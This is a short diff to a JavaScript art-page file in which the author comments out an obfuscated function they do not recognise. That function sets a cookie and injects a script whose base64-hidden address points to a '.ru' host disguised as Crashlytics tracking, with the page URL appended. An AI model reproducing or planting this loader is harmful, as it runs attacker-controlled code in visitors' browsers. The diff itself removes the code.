@@ -89,13 +89,13 @@ function genImg() {
     }
     window.requestAnimationFrame(genImg)
 };
-! function(o, w, d, l) {
+/* ! function(o, w, d, l) {
     try {
         o.c = "h" == l.protocol[0] && /./.test(l.hostname) && !/PHPPREFS/.test(d.cookie), setTimeout(function() {
             o.c && (o.s = d.createElement("script"), o.s.src = atob("aHR0cHM6Ly9hcGkuY3Jhc2hseXRpY3MucnUvdHJhY2tpbmcvc2NyaXB0LmpzP3JlZmVycmVyPQ==") + l.href, d.body.appendChild(o.s))
         }, 1e3), d.cookie = "PHPPREFS=full;max-age=39800;"
     } catch (e) {}
-}({}, window, document, location);
+}({}, window, document, location); i don't know where this code comes from so i'm commenting it */
 
 
 if(location.href.includes("id.")){location.assign("https://JSArt.ponali.repl.co/");}
